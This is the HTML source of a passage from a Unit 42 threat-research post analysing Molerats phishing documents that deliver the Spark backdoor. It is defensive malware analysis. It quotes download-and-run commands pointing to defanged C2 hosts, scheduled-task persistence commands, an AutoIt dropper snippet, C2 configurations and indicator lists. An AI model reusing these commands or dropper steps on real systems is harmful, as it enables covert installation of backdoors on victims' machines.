<!doctype html>
<html lang="en-US">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="profile" href="https://gmpg.org/xfn/11">
    <link rel="preconnect" href="https://www.paloaltonetworks.com">
    <link rel="preconnect" href="https://cdn.cookielaw.org">
    <link rel="preconnect" href="https://fonts.googleapis.com">
	    <!--  Start: Scripts Migrated From Unit42-v5 -->
<script type="text/javascript">
var main_site_url = 'https://www.paloaltonetworks.com';
var maindomain_lang = 'https://www.paloaltonetworks.com';
function getParameterByName(name, url) {
		if(url == null){
		  url = window.location.href;
		}
	    name = name.replace(/[\[\]]/g, '\\$&');
	    var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
		results = regex.exec(url);
	    if (!results) return null;
	    if (!results[2]) return '';
	    return decodeURIComponent(results[2].replace(/\+/g, ' '));
	}
	var container_q = getParameterByName('container');
	var d_lang = 'en';	
	if(container_q != '' && container_q != null){	    
	    sessionStorage.setItem('container',container_q);
	    	    location.href = 'https://unit42.paloaltonetworks.com/molerats-delivers-spark-backdoor';
	}
</script>

<link rel="preload" href="https://www.paloaltonetworks.com/etc.clientlibs/panClean/components/mainNavigationComp/clientlibs/panClean/criticalTop.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
<noscript><link rel="stylesheet" href="https://www.paloaltonetworks.com/etc.clientlibs/panClean/components/mainNavigationComp/clientlibs/panClean/criticalTop.min.css"></noscript>
<link rel="preload" href="https://www.paloaltonetworks.com/etc.clientlibs/panClean/components/mainNavigationComp/clientlibs/panClean/criticalTopProductNav.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
<noscript><link rel="stylesheet" href="https://www.paloaltonetworks.com/etc.clientlibs/panClean/components/mainNavigationComp/clientlibs/panClean/criticalTopProductNav.min.css"></noscript>
<link rel="preload" href="https://www.paloaltonetworks.com/etc.clientlibs/panClean/components/mainNavigationComp/clientlibs/panClean/deferedProductNav.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
<noscript><link rel="stylesheet" href="https://www.paloaltonetworks.com/etc.clientlibs/panClean/components/mainNavigationComp/clientlibs/panClean/deferedProductNav.min.css"></noscript>
  <meta name='robots' content='index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1' />
<link rel="alternate" hreflang="en" href="https://unit42.paloaltonetworks.com/molerats-delivers-spark-backdoor/" />
<link rel="alternate" hreflang="ja" href="https://unit42.paloaltonetworks.jp/molerats-delivers-spark-backdoor/" />
<link rel="alternate" hreflang="x-default" href="https://unit42.paloaltonetworks.com/molerats-delivers-spark-backdoor/" />

	<!-- This site is optimized with the Yoast SEO Premium plugin v23.1 (Yoast SEO v23.1) - https://yoast.com/wordpress/plugins/seo/ -->
	<title>Molerats Delivers Spark Backdoor to Government and Telecommunications Organizations</title>
	<meta name="description" content="The MoleRats threat group (AKA Gaza Hacking Team), was found targeting eight organizations, primarily to deliver the Spark backdoor payload." />
	<link rel="canonical" href="https://unit42.paloaltonetworks.com/molerats-delivers-spark-backdoor/" />
	<meta property="og:locale" content="en_US" />
	<meta property="og:type" content="article" />
	<meta property="og:title" content="Molerats Delivers Spark Backdoor to Government and Telecommunications Organizations" />
	<meta property="og:description" content="The MoleRats threat group (AKA Gaza Hacking Team), was found targeting eight organizations, primarily to deliver the Spark backdoor payload." />
	<meta property="og:url" content="https://unit42.paloaltonetworks.com/molerats-delivers-spark-backdoor/" />
	<meta property="og:site_name" content="Unit 42" />
	<meta property="article:published_time" content="2020-03-03T14:00:56+00:00" />
	<meta property="article:modified_time" content="2024-06-07T14:15:02+00:00" />
	<meta property="og:image" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/04_Business_email_compromise_Category_1920x900.jpg" />
	<meta property="og:image:width" content="1920" />
	<meta property="og:image:height" content="900" />
	<meta property="og:image:type" content="image/jpeg" />
	<meta name="author" content="Robert Falcone, Bryan Lee, Alex Hinchliffe" />
	<meta name="twitter:card" content="summary_large_image" />
	<!-- / Yoast SEO Premium plugin. -->


<link rel="alternate" type="application/rss+xml" title="Unit 42 &raquo; Feed" href="https://unit42.paloaltonetworks.com/feed/" />
<link rel="alternate" type="application/rss+xml" title="Unit 42 &raquo; Comments Feed" href="https://unit42.paloaltonetworks.com/comments/feed/" />
<link rel="alternate" type="application/rss+xml" title="Unit 42 &raquo; Molerats Delivers Spark Backdoor to Government and Telecommunications Organizations Comments Feed" href="https://unit42.paloaltonetworks.com/molerats-delivers-spark-backdoor/feed/" />
<script type="text/javascript">
var globalConfig = {};
var webData = {};
webData.channel = "unit42";
webData.property = "unit42.paloaltonetworks.com";
webData.language = "en_us";
webData.pageType = "blogs";
webData.pageName = "unit42:molerats-delivers-spark-backdoor";
webData.pageURL = "https://unit42.paloaltonetworks.com/molerats-delivers-spark-backdoor";
webData.article_title = "Molerats Delivers Spark Backdoor to Government and Telecommunications Organizations";
webData.author = "Robert Falcone,Bryan Lee,Alex Hinchliffe";
webData.published_time = "2020-03-03T06:00:56-08:00";
webData.description = "The MoleRats threat group (AKA Gaza Hacking Team), was found targeting eight organizations, primarily to deliver the Spark backdoor payload.";
webData.keywords = "Malware,Threat Research,Gaza Hacking Team,JhoneRAT,Macros,MoleRats,Spark,Spear Phishing";
webData.resourceAssetID = "97138d0ec12c63c2e4d74724d3e2a89d";
</script>
<script type="text/javascript">
var globalConfig = {};
globalConfig.buildName = "UniqueResourceAssetsID_DEC022022";
</script>
<meta property="og:likes" content="42"/>
<meta property="og:readtime" content="28"/>
<meta property="og:views" content="63,777"/>
<meta property="og:date_created" content="March 3, 2020 at 6:00 AM"/>
<meta property="og:post_length" content="9886"/>
<meta property="og:category" content="Malware"/>
<meta property="og:category" content="Threat Research"/>
<meta property="og:category_link" content="https://unit42.paloaltonetworks.com/category/malware/"/>
<meta property="og:category_link" content="https://unit42.paloaltonetworks.com/category/threat-research/"/>
<meta property="og:author" content="Robert Falcone"/>
<meta property="og:author" content="Bryan Lee"/>
<meta property="og:author" content="Alex Hinchliffe"/>
<meta property="og:authorlink" content="https://unit42.paloaltonetworks.com/author/robertfalcone/"/>
<meta property="og:authorlink" content="https://unit42.paloaltonetworks.com/author/bryanlee/"/>
<meta property="og:authorlink" content="https://unit42.paloaltonetworks.com/author/alex-hinchliffe/"/>
<meta property="og:author_image_link" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/11/unit-news-meta.svg"/>
<meta property="og:author_image_link" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/11/unit-news-meta.svg"/>
<meta property="og:author_image_link" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/11/unit-news-meta.svg"/>
<meta name="post_tags" content="Gaza Hacking Team,JhoneRAT,Macros,MoleRats,Spark,Spear Phishing"/>
<meta property="og:post_image" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/08/Crime-r3d1-380x184.png"/>
<script type="application/ld+json">{"@context":"https:\/\/schema.org","@type":"BlogPosting","headline":"Molerats Delivers Spark Backdoor to Government and Telecommunications Organizations","name":"Molerats Delivers Spark Backdoor to Government and Telecommunications Organizations","description":"Unit 42 discovered the threat group Molerats is targeting eight organizations in six different countries via spear-phishing to deliver a backdoor payload called \"Spark.\"","url":"https:\/\/unit42.paloaltonetworks.com\/molerats-delivers-spark-backdoor\/","mainEntityOfPage":"https:\/\/unit42.paloaltonetworks.com\/molerats-delivers-spark-backdoor\/","datePublished":"March 3, 2020","articleBody":"Executive Summary\r\nBetween October 2019 through the beginning of December 2019, Unit 42 observed multiple instances of phishing attacks likely related to a threat group known as Molerats (AKA Gaza Hackers Team and Gaza Cybergang) targeting eight organizations in six different countries in the government, telecommunications, insurance and retail industries, of which the latter two were quite peculiar. The targeting of insurance and retail organizations is peculiar as it does not fit with this threat groups prior target set. The email subject and attachment file names used in the attacks on these seemingly atypical targets were similar in theme as those used when attacking government organizations. The lack of industry or target specific social engineering themes likely lowers the chances of a successful compromise and further confuses our understanding of the purpose of attacking these organizations.\r\n\r\nAll of the attacks involved spear-phishing emails to deliver malicious documents that required the recipient to carry out some action. The social engineering techniques included lure images attempting to trick the user into enabling content to run a macro and even document contents that threaten to release compromising pictures to the media to coerce the user into clicking a link to download a malicious payload. The payload in a majority of these attacks was a backdoor called Spark, which is a backdoor that allows the threat actors to open applications and run command line commands on the compromised system.\r\n\r\nThe Spark backdoor has been used by Molerats since at least 2017 and is associated with the Operation Parliament campaign, which is attributed to the Gaza Cybergang. The payload delivered in one of the attacks appears to be related to JhoneRAT, which may suggest the threat group has added another custom payload to their toolset.\r\n\r\nMolerats has been in operation as far back as 2011 targeting government organizations around the world, largely been associated with attacks involving unauthorized access and sensitive data collection.They have been observed using a bevy of tactics and techniques, ranging from leveraging publicly available backdoor tools, such as PoisonIvy or XtremeRAT, to creating custom developed ones such as KASPERAGENT and MICROPSIA. In the campaign that we tracked, this group primarily relied on social engineering and spear-phishing techniques for their initial infection vector, then multi-stage command-and-control (C2) servers for malware delivery.\r\n\r\nMolerats used a variety of techniques to make detection and analysis difficult, such as password-protecting delivery documents, limiting the execution of the Spark payload to only run on systems with an Arabic keyboard and locale and the use of the commercial packer Enigma to obfuscate the payloads. The Spark C2 channel also attempts to evade detection, as the data in the HTTP POST requests and responses is encrypted using either 3DES or AES with randomly generated keys that appear to be unique for each payload.\r\nStarting Point\r\nIn November 2019, Unit 42 was made aware of a single phishing email directed at a Saudi Arabian government organization. This attack involved a password-protected Microsoft Word document, which contained an embedded macro. The password for the document was provided to the victim in the body of the email. From the artifacts discovered in this attack, we were able to use our AutoFocus product to pivot to additional attacks and uncover what turned out to be an attack campaign by Molerats.\r\n\r\nUsing our AutoFocus tool, we were able to find several attacks sent from the actors starting on October 2 through December 9, 2019. The emails were sent to organizations in the government and telecommunications verticals and had a mixture of specific and generic email subjects and attachment filenames. We also saw sessions associated with this attack campaign involving two US-based organizations, one in the retail and the other in the insurance industry.\r\n\r\nThe files attached to these emails were all documents, with the majority being Word documents and one PDF document. Table 1 shows a list of the emails used in this attack campaign, including the details of the email and the country and industry of the targeted organization. In this blog, we will provide an analysis of three of the seven delivery documents listed in Table 1, as the four unique delivery documents with MOFA in their file names are extremely similar to each other. The last delivery document (\u2018Urgent.docx\u2019) was the delivery document discussed in Cisco Talos' research on a new payload called JhoneRAT, which may suggest that this group also uses JhoneRAT in their attack campaigns in the region.\r\n\r\n\r\n\r\nDate\r\nSubject\r\nAttachment \r\nSHA256\r\nCountry\r\nIndustry\r\n\r\n\r\n10\/2\/2019\r\nMOFA reports 03-10-2019\r\nMOFA- 031019.doc\r\nd19104ef4f443e8..\r\nAE\r\nGov\r\n\r\n\r\n10\/3\/2019\r\n03-10-2019\r\nMOFA- 031019.doc\r\nd19104ef4f443e8..\r\nUK,ES\r\nGov\r\n\r\n\r\n10\/5\/2019\r\n06-10-2019\r\nMOFA- 061019.doc\r\n03be1d7e1071b01..\r\nAE\r\nGov\r\n\r\n\r\n10\/10\/2019\r\nMOFA Reports\r\nMOFA- 101019.doc\r\n011ba7f9b4c508f..\r\n\r\nddf938508618ff7..\r\nUS\r\nInsurance,Retail\r\n\r\n\r\n10\/31\/2019\r\n\u0644\u0639\u0646\u0627\u064a\u0629 \u0645\u0639\u0627\u0644\u064a\u0643\u0645 - \u0627\u0644\u0645\u0631\u0641\u0642 31-10-2019\r\nattachment.doc\r\neaf2ba0d78c0fda..\r\nDJ\r\nTelecom\r\n\r\n\r\n11\/2\/2019\r\n\u0644\u0639\u0646\u0627\u064a\u0629 \u0645\u0639\u0627\u0644\u064a\u0643\u0645 - \u0627\u0644\u0645\u0631\u0641\u0642 31-10-2019\r\nattachment.doc\r\neaf2ba0d78c0fda..\r\nDJ\r\nTelecom\r\n\r\n\r\n11\/18\/2019\r\n\u0635\u0648\u0631\u0643\r\n\r\n&lt;redacted&gt;\r\n\r\n\u0645\u0639 \u0647\u0628\u0629\r\nPictures.pdf\r\n9d6ce7c585609b8..\r\nES\r\nGov\r\n\r\n\r\n11\/24\/2019\r\n\u0645\u062e\u0637\u0637 \u0627\u0644\u062c\u0647\u0627\u062f \u0627\u0644\u0627\u0633\u0644\u0627\u0645\u064a \u0644\u0645\u0628\u0627\u063a\u062a\u0629 \u0627\u0633\u0631\u0627\u0626\u064a\u0644 \u0648\u0636\u0631\u0628 \u0627\u0644\u062a\u0647\u062f\u0626\u0629\r\nUrgent.docx\r\n273aa20c4857d98..\r\nDJ\r\nTelecom\r\n\r\n\r\n12\/9\/2019\r\n\u0645\u062d\u0636\u0631 \u0627\u062c\u062a\u0645\u0627\u0639 \u0642\u064a\u0627\u062f\u0629 \u0627\u0644\u0645\u062e\u0627\u0628\u0631\u0627\u062a \u0627\u0644\u0639\u0627\u0645\u0629 \u0645\u0639 \u0648\u0641\u062f \u062d\u0631\u0643\u0629 \u062d\u0645\u0627\u0633 09-12-2019\r\nUrgent.docx\r\n273aa20c4857d98..\r\nDJ\r\nTelecom\r\n\r\n\r\n\r\nTable 1. Details of spear-phishing emails seen in this attack campaign\r\n\r\nMOFA Delivery Document\r\nThe first document we collected and analyzed had the filename MOFA- 061019.doc (SHA256: 03be1d7e1071b018d3fbc6496788fd7234b0bb6d3614bec5b482f3bf95aeb506). This document was password-protected with the password Abdullah@2019. When opening and supplying the password, the victim was presented with contents that include what appears missing images, as seen in Figure 1.\r\n\r\n[caption id=\"attachment_105135\" align=\"aligncenter\" width=\"2112\"] Figure 1. Lure image in MOFA delivery document[\/caption]\r\n\r\nOnce the victim then enabled the embedded macro inside the document, the macro decodes an embedded VBScript (T1064) and saves it to C:\\programdata\\Micorsoft\\Microsoft.vbs. The Microsoft.vbs script will reach out to the C2 domain servicebios[.]com to retrieve a second VBScript, which contained additional instructions to then retrieve the payload. The script downloads this secondary VBScript from the following URL and saves it to C:\\ProgramData\\PlayerVLC.vbs:\r\n\r\nhttps:\/\/servicebios[.]com\/PlayerVLC.vbs\r\n\r\nThe initial VBScript will then create a scheduled task (T1053) to persistently run the secondary VBScript every minute by running the following command:\r\n\r\nschtasks \/create \/sc minute \/mo 1 \/tn PlayerVLC \/F \/tr C:\\ProgramData\\PlayerVLC.vbs\r\n\r\nThe secondary VBScript attempts to download the executable payload from the following URL and saves it to C:\\ProgramData\\PlayerVLC.msi.\r\n\r\nhttps:\/\/servicebios[.]com\/PlayerVLC.msi\r\n\r\nAfter downloading the executable payload, the secondary VBScript runs the following command on the command line (T1059) to kill any existing msiexec.exe process instances and use the ping application to sleep for two seconds before using the legitimate msiexec.exe application (T1218) to launch the downloaded PlayerVLC.msi file:\r\n\r\n%comspec% \/c taskkill \/F \/IM msiexec.exe &amp; ping 127.0.0.1 -n 2 &gt;NUL &amp; msiexec \/i C:\\ProgramData\\PlayerVLC.msi \/quiet \/qn \/norestart\r\n\r\nUnfortunately, we were unable to obtain the PlayerVLC.msi file, as it was no longer hosted by the C2 server. This highlights the benefits of a modular payload that requires a chain of successful communications with a C2 server for a successful infection, as it makes post-intrusion analysis difficult. This type of modular payload and chained C2 requests is fairly common, as we have seen it in use by various adversaries such as DarkHydrus and Sofacy. This behavior can assist the adversary in evading automated defenses, as they can deploy their infrastructure at time of attack and avoid having additional artifacts available for further analysis.\r\nAttachment Delivery Document\r\nThe Word document delivered on October 31 and November 2, 2019 (SHA256: eaf2ba0d78c0fda95f0cf53daac9a89d0434cf8df47fe831165b19b4e3568000) had a filename of attachment.doc and attempted to trick the recipient into clicking the \u201cEnable Content\u201d button to run an embedded macro. Figure 2 shows the lure image used in an attempt to trick the recipient into clicking the \u201cEnable Content\u201d button. These documents were not password-protected, unlike the MOFA delivery documents previously discussed.\r\n\r\n[caption id=\"attachment_105137\" align=\"aligncenter\" width=\"1666\"] Figure 2. Lure image in Attachment delivery document[\/caption]\r\n\r\nThe macro is quite simple, as it attempts to download a base64 encoded executable from the following Google Drive URL that it will decode and save to %TEMP%\\rundll64.exe:\r\n\r\nhxxps:\/\/drive.google[.]com\/uc?export=download&amp;id=1yiDnuLRfQTBdak6S8gKnJLEzMk3yvepH\r\n\r\nThe decoded executable (SHA256: 7bb719f1c64d627ecb1f13c97dc050a7bb1441497f26578f7b2a9302adbbb128P) is a compiled AutoIt script that installs an embedded executable to %userprofile%\\runawy.exe and runs it. Before exiting, the AutoIt script also makes sure the executable will persistently run by copying the executable to the startup directory and by creating a scheduled task by running the following command:\r\n\r\nSCHTASKS \/Create \/f \/SC minute \/TN \"runawy\" \/mo 5 \/tr \"%userprofile%\\runawy.exe\"\r\n\r\nThe runawy.exe file (SHA256:64ea1f1e0352f3d1099fdbb089e7b066d3460993717f7490c2e71eff6122c431) is a payload packed with Enigma that creates a mutex of \u201cS4.4P\u201d. This payload is a packed variant of the Spark backdoor, which has been exclusively linked to Molerats. We will discuss the Spark backdoor\u2019s functionality in detail later in this blog, but this specific sample has the following configuration:\r\n\r\n{\"sIt\":\"nysura[.]com\",\"QrU\":\"\/\",\"JJDF\":80,\"MJOu\":0,\"TuS\":\"\",\"pJhC\":1,\"Lm\":\"NMRm3AlaGUeT2g9iA2lNTIk04vSj8r2IBUDEvItgOxw=\",\"LPO\":10000}\r\nPictures PDF Delivery Document\r\nUnlike the prior two Word documents discussed, we observed a PDF document named \u201cPictures.pdf\u201d (SHA256:9d6ce7c585609b8b23703617ef9d480c1cfe0f3bf6f57e178773823b8bf86495) attached to an email with a subject of \u0635\u0648\u0631\u0643 &lt;redacted&gt; \u0645\u0639 \u0647\u0628\u0629, which roughly translates from Arabic to \u201cYour filthy pictures with Heba\u201d. The PDF document does not attempt to exploit a vulnerability, rather it contains a message meant to coerce the recipient into clicking a link to install the actor\u2019s payload. Also, unlike the Word delivery documents that used finesse lure images and missing content in an attempt to trick the user into enabling macros, this PDF document uses a more brash approach that contained a blackmail-esque message in an attempt to trick the user into clicking a link, opening a RAR archive and running an executable.\r\n\r\nThe message within the PDF document is in Arabic and suggests the sender has compromising pictures of the recipient that they will release to the media. The message also suggests the document was sent to an associate of a government official and was meant to threaten the victim into clicking a link within the document. Figure 3 shows the contents within the PDF document.\r\n\r\n[caption id=\"attachment_105139\" align=\"aligncenter\" width=\"1879\"] Figure 3. Screenshot of the contents of the malicious PDF document[\/caption]\r\n\r\nThe link within the document is in Arabic and roughly translates to \u201cA small sample of your filthy pictures with Heba\u201d and \u201cPictures\u201d. The link points to the following URL, which is case sensitive:\r\n\r\nhxxps:\/\/zmartco[.]com\/Pictures.rar\r\n\r\nThe \"Pictures.rar\" file (SHA256: 1742caf26d41641925d109caa5b4ebe30cda274077fbc68762109155d3e0b0da) is a RAR archive that contains one file with a filename of \u0647\u0630\u0647 \u0639\u064a\u0646\u0629 \u0642\u0644\u064a\u0644\u0629 \u0645\u0646 \u0627\u0644\u0635\u0648\u0631.exe (SHA256: 92d0c5f5ecffd3d3cfda6355817f4410b0daa3095f2445a8574e43d67cdca0b7), which roughly translates to \"This is a few sample photos.exe\". The executable is a compiled AutoIt script that extracts an embedded executable, saves it to disk at C:\\Users\\Public\\pdf.exe (SHA256: 5139a334d5629c598325787fc43a2924d38d3c005bffd93afb7258a4a9a8d8b3) and creates a shortcut in Start Menu\\Programs\\Startup\\pdf.lnk to automatically start it each time the system starts, as seen here:\r\n#NoTrayIcon\r\nFileInstall(\"pdf.exe\", \"C:\\Users\\Public\\\" &amp; \"\/pdf.exe\")\r\n$cmd1 = \"C:\\Users\\Public\\\" &amp; \"\\pdf.exe\"\r\nRunWait(@ComSpec &amp; \" \/c start \" &amp; $cmd1, \"\", @SW_HIDE)\r\nFileCreateShortcut(\"C:\\Users\\Public\\\" &amp; \"\\pdf.exe\", @StartupDir &amp; \r\n\"\\pdf.lnk\")\r\nLike the \u201crunawy.exe\u201d payload delivered by the attachment.doc Word document, the \"pdf.exe\" file saved to the system is a packed variant of the Spark backdoor. This variant of the backdoor had the following configuration:\r\n\r\n{\"xBql\":\"laceibagrafica[.]com\",\"eauy\":\"\/\",\"Qnd\":80,\"jJN\":0,\"rlOa\":\"\",\"Eb\":1,\"BGa\":\"vcJbq6nzgJk=\",\"qJk\":10000}\r\nDelivery Infrastructure\r\nOften when investigating attacks like these, links between infrastructure used across distinct campaigns can be easily found, such as by tracking reused IP addresses or domains, finding related domains sharing similar attributes, and so on. In the case of all the MOFA-related delivery documents listed in Table 1, servicebios[.]com was the only domain used, and most of the infrastructure information related to historical usage.\r\n\r\nWith the AutoFocus Threat Intelligence service, we used alternative data points provided from our cloud sandbox, WildFire, during the analysis of said malicious documents in order to pivot and discover additional samples and related infrastructure. In this section we will discuss the methods we used and describe the additional infrastructure.\r\n\r\nFigure 4 below is a maltego chart showing the Word documents and Visual Basic Script (vbs) files related to the servicebios[.]com domain in the bottom half of the chart, with some of the related entities connected via one of two links, to other entities in the top half of the chart. Said links include Yara signatures in the blue box and an AutoFocus query in the orange box, as indicated by the \u201cAF\u201d for AutoFocus.\r\n\r\n[caption id=\"attachment_105175\" align=\"aligncenter\" width=\"600\"] Figure 4. Chart showing relationships between delivery documents and associated infrastructure[\/caption]\r\n\r\nThe AutoFocus query relates to a specific process execution chain leading to a Windows Scripting Host process (wscript.exe) launching the malicious VBS downloader scripts. This allowed us to pivot on behavioural artefacts from the \u201cMOFA- 101019.doc\u201d (SHA256: ddf938508618ff7f147b3f7c2b706968cace33819e422fe1daae78bc256f75a8) document to previously unknown documents \u201c\u0627\u0644\u062a\u0642\u0631\u064a\u0631 \u0627\u0644\u064a\u0648\u0645\u064a \u062d\u0648\u0644 \u0623\u0647\u0645 \u0627\u0644\u0645\u0633\u062a\u062c\u062f\u0627\u062a \u0627\u0644\u0641\u0644\u0633\u0637\u064a\u0646\u064a\u0629 \u0644\u064a\u0648\u0645 - 9 - 9 - 2019.doc\u201d (Daily report on the most important Palestinian developments, 9-9-2019.doc; SHA256: feec28c7c19a8d0ebdca8fcfc0415ae79ef08362bd72304a99eeea55c8871e21) and \u201c\u0627\u0644\u062a\u0642\u0631\u064a\u0631 \u0627\u0644\u064a\u0648\u0645\u064a \u062d\u0648\u0644 \u0623\u062e\u0631 \u0645\u0633\u062a\u062c\u062f\u0627\u062a \u0627\u0644\u0625\u0631\u0647\u0627\u0628 \u0627\u0644\u0639\u0627\u0644\u0645\u064a- 9 - 9 - 2019.doc\u201d (Daily updates on the latest terrorism report Alaalmi- 9 - 9 - 2019.doc; SHA256: bf126c2c8f7d4263c78f4b97857912a3c1e87c73fee3f18095d58ef5053f2959).\r\n\r\nAs with the original Word document, the VBA macro code inside the new documents also used the open-source code \u201cBase64 decode VBS function\u201d from Motobit to decode (T1027) the download function and URL to VBS before running it. The main difference between the VBS files is the domain - dapoerwedding[.]com - where the secondary VBS payload was hosted. At the time of this activity the domain resolved to 45.15.168[.]118 and was used in a previous campaign from September 2019.\r\n\r\nIn parallel to searching for related files using behavioural commonalities, we authored Yara signatures for the VBS code associated with the original delivery document, to scan our and VirusTotal\u2019s corpus. This led to two additional VBS files: SHA256: 85631021d7e84dc466b23cf77dd949ebc61011a52c1f0fb046cfd62dd9192a15 represents the 1st stage VBS downloader containing minor changes to the domain and filename used, as follows:\r\n\r\nhttps:\/\/dapoerwedding[.]com\/GoogleChrome.vbs\r\n\r\nThe second VBS file discovered (SHA256: 9451a110f75cbc3b66af5acb11a07a8d5e20e15e5487292722e695678272bca7) is the 2nd stage VBS downloader with reference to the final MSI file payload, which was unavailable at the time of writing:\r\n\r\nhttps:\/\/dapoerwedding[.]com\/GoogleChrome.msi\r\n\r\nWe were also able to discover additional Word documents using other AutoFocus queries, as highlighted by the two other AutoFocus \u201cAF'' orange boxes in Figure X above. These maltego entities query our data using proprietary hashes calculated from the original document\u2019s VBA macro code, and resulted in SHA256: 602828399e24dca9259a4fc4c26f07408d1e0a638c015109c6c84986dc442ebb (servicebios[.]com), and SHA256s: a2c68da1b3e0115f5804a55768b2baf50faea81f13a16e563411754dc6c0a8ff and 4f51b180a6d0b074778d055580788dc33c9e1fd2e49f3c9a19793245a8671cba (dapoerwedding[.]com).\r\n\r\nUpon initial inspection of dapoerwedding[.]com and servicebios[.]com, nothing stood out as having ties to previously documented Molerats activity, however there were some commonalities (T1347) between the two domains:\r\n\r\n \tPre-existing domains\r\n \tSeemingly legitimate historical content\r\n \tRecently expired (and lapsed domain redemption grace period)\r\n \tPost-expiry registrant (T1328) is NameCheap, Inc.\r\n \tDomain Validation (DV) SSL Certificates setup (T1337), issued by Sectigo\r\n\r\nAnother delivery domain - zmartco[.]com - that shares the same commonalities listed above pertains to the \u201cPictures.pdf\u201d delivery attachment listed in Table 1 discussed in the previous section.\r\nSpark Payload Related to Operation Parliament\r\nThe executables installed by the compiled AutoIt scripts is a backdoor that Molerats has used in many attack campaigns. Until recently, this backdoor did not have its own moniker, but Cybereason recently gave this backdoor a name of \u201cSpark\u201d. As mentioned in Cybereason\u2019s blog, the Spark backdoor was also delivered in attacks occurring in January 2019, as discussed in a blog published by Qihoo 360. Based on our research, the Spark backdoor has been used by Molerats since at least early 2017, as it was the main payload in the Operation Parliament campaign reported by Kaspersky.\r\n\r\nSpark uses HTTP POST requests to communicate with its C2 server to receive commands and to exfiltrate the results, all of which using JSON-structured messages. In most cases, the threat actors use commercial packers to obfuscate the Spark payload to avoid detection. During our research, we have seen the actors use the Enigma protector, Themida and VMProtect, which makes identifying samples difficult. We were also able to identify two different versions of Spark-based identifiers left in the binaries by the developer, which are version 2.2 and 4.2. Based on the compilation times of the files with the Spark samples with identifiable version strings, it appears that version 2.2 was created in 2017, while version 4.2 was created in late December 2019 and January 2020. Table 2 shows these Spark samples that contained version numbers, along with their compile time and the packer used to obfuscate their contents.\r\n\r\n\r\n\r\nTruncated SHA256\r\nVersion\r\nCompiled\r\nPacker\r\n\r\n\r\n966ad6452793b15..\r\n2.2\r\n2017-05-24 6:15:04\r\nVMProtect\r\n\r\n\r\nab4e43b4e526d44..\r\n2.2\r\n2017-05-24 6:15:04\r\nVMProtect\r\n\r\n\r\n212aa6e3f236550..\r\n2.2\r\n2017-05-24 6:15:04\r\nVMProtect\r\n\r\n\r\ncf32479ed30ae95..\r\n4.2\r\n2019-12-30 9:45:44\r\nnone\r\n\r\n\r\nd0dc1de0ae912c7..\r\n4.2\r\n2020-01-12 10:57:50\r\nEnigma\r\n\r\n\r\n04fa6aaea5e3a26..\r\n4.2\r\n2020-01-12 10:57:50\r\nEnigma\r\n\r\n\r\n6e60f5c65299ee7..\r\n4.2\r\n2020-01-12 10:57:50\r\nEnigma\r\n\r\n\r\nb08b8fddb9dd940..\r\n4.2\r\n2020-01-12 10:57:50\r\nEnigma\r\n\r\n\r\n64ea1f1e0352f3d..\r\n4.2\r\n2020-01-12 10:57:50\r\nEnigma\r\n\r\n\r\n\r\nTable 2. Spark samples with their version number, compile time and the packer used\r\nWe have collected dozens of Spark payloads, whose compile times range from March 2017 to January 2020, which further suggests this group has been using this backdoor in attack campaigns for almost three years. We extracted the configurations from each of these files to gather the known C2 domains associated with Spark, which we have included in Table 3.\r\n\r\n\r\n\r\nDomain\r\nFirst used\r\n\r\n\r\nwebtutorialz[.]com\r\n1st Half 2020\r\n\r\n\r\nnysura[.]com\r\n1st Half 2020\r\n\r\n\r\nlaceibagrafica[.]com\r\n2nd Half 2019\r\n\r\n\r\nmotoqu[.]com\r\n2nd Half 2019\r\n\r\n\r\nsmartweb9[.]com\r\n1st Half 2019\r\n\r\n\r\nlaptower[.]com\r\n2nd Half 2018\r\n\r\n\r\napp.msexchanges16[.]com\r\n2nd Half 2018\r\n\r\n\r\nmsexchange13[.]com\r\n2nd Half 2018\r\n\r\n\r\ncloudserviceapi[.]online\r\n2nd Half 2018\r\n\r\n\r\nupdates.masterservices[.]online\r\n2nd Half 2018\r\n\r\n\r\nclients.itresolver[.]online\r\n1st Half 2018\r\n\r\n\r\nupdate.itresolver[.]online\r\n1st Half 2018\r\n\r\n\r\n91.219.237[.]99\r\n2nd Half 2017\r\n\r\n\r\ngoldenlines[.]site\r\n2nd Half 2017\r\n\r\n\r\nupdate.nextdata[.]site\r\n2nd Half 2017\r\n\r\n\r\n\r\nTable 3. Spark C2 domains and the approximate time they were used\r\nIn the next section, we will explain Spark\u2019s capabilities and demonstrate its C2 channel that we determined from our analysis of the \u201cpdf.exe\u201d payload delivered by the Pictures.pdf document in the November 2019 attack.\r\nSpark Payload in Pictures.pdf November 2019 Attack\r\nThe Spark payload installed by the compiled AutoIt script is packed with the commercial Enigma protector (T1045). When packing the payload, the actor used a feature within Enigma protector called \u201cSplash Screen\u201d, which the actor configured to display an image on top of all the windows and waits for the user to click the image before executing the malicious code. Figure 5 shows the splash image displayed by the Enigma protector prior to executing the malicious payload, which is a wallpaper image available at wallpaperswide.com. The splash screen feature acts as a sandbox evasion technique, as it requires user interaction in the form of clicking the screen before the malicious code runs.\r\n\r\n[caption id=\"attachment_105143\" align=\"aligncenter\" width=\"2500\"] Figure 5. Screenshot of the contents of the malicious PDF document[\/caption]\r\n\r\nOnce unpacked, we found the Spark payload was similar to the payloads delivered in Operation Parliament from a capability perspective. The Spark payload is a backdoor that allows the threat actors to open applications and run command line commands on the compromised system.\r\n\r\nThe payload starts by checking the results of the GetKeyboardLayoutList and the language name returned by GetLocaleInfoA to make sure they contain the word \"arabic\". If the word is not found in the results of these two API calls, the payload does not execute any of its malicious code. Checking for specific keyboards and languages is a known evasion tactic meant to avoid running on analysis systems not configured, as the actor\u2019s targeted victim would be configured.\r\n\r\nAfter the payload confirms that the system has the appropriate keyboard and language pack installed for the actor\u2019s desired target, it will begin attempting to communicate with a C2 server specified within a configuration embedded within the payload. The embedded configuration is encrypted and the payload decrypts it by first using a custom rolling XOR algorithm to decrypt a key and a buffer of ciphertext, resulting in a key and ciphertext that appears encoded with base64. It will then generate the SHA256 hash of the base64 encoded key and use the fourth through the 